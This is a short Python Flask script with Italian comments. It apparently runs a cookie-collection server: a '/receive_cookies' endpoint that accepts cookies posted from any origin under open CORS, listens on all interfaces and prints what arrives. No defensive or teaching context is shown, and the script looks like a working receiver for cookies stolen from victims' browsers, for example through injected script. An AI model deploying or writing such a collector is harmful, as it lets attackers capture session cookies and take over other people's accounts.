from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Abilita CORS

# Variabile per impostare la porta
SERVER_PORT = 5000  # Puoi cambiare questa porta come desideri

# Endpoint per ricevere i cookie
@app.route('/receive_cookies', methods=['POST'])
def receive_cookies():
    cookies = request.json.get('cookies', {})
    if cookies:
        print(f"Cookies ricevuti: {cookies}")
        return jsonify({"message": "Cookies ricevuti con successo"}), 200
    else:
        return jsonify({"message": "Nessun cookie fornito"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=SERVER_PORT)
